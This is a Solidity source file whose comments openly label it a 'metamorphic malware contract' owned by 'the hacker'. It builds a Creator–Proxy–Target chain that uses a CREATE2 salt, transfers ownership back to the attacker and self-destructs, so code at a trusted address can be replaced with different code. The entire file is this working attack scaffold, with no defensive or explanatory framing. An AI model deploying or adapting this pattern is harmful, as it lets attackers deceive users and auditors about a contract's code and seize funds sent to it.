// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "../node_modules/@openzeppelin/contracts/access/Ownable.sol";

// NOTE: Metamorphic malware contract.
contract Target is Ownable {
    constructor(address creator) {
        _transferOwnership(creator); // NOTE: Transfering ownership from the 'Proxy' contract to the 'Creator' contract owned by the hacker.
    }

    receive() external payable {}

    fallback() external payable {}

    function destroy() external onlyOwner {
        selfdestruct(payable(owner()));
    }
}

contract Proxy is Ownable {
    Target private _target;

    event CreateTarget(address addressTarget);
    event DestroyTarget(address addressTarget);

    constructor() {} // NOTE: 'Ownable' will set the 'Creator' contract owned by the hacker as the 'Proxy' contract owner.

    function createTarget() external onlyOwner returns (Target) {
        _target = new Target(owner()); // NOTE: Passing down the 'Creator' contract address.
        return _target;
    }

    function destroy() external onlyOwner {
        selfdestruct(payable(owner()));
    }
}

contract Creator is Ownable {
    Proxy private _proxy;
    Target private _target;

    event CreateProxy(address addressProxy);
    event DestroyProxy(address addressProxy);
    event CreateTarget(address addressTarget);
    event DestroyTarget(address addressTarget);

    constructor() {} // NOTE: 'Ownable' will set the caller (hacker) as the 'Creator' contract owner.

    function create(uint256 salt) external onlyOwner {
        _proxy = new Proxy{salt: bytes32(salt)}();
        emit CreateProxy(address(_proxy));
        _target = _proxy.createTarget();
        emit CreateTarget(address(_target));
    }

    function destroy() external onlyOwner {
        emit DestroyTarget(address(_target));
        _target.destroy();
        emit DestroyProxy(address(_proxy));
        _proxy.destroy();
    }
}
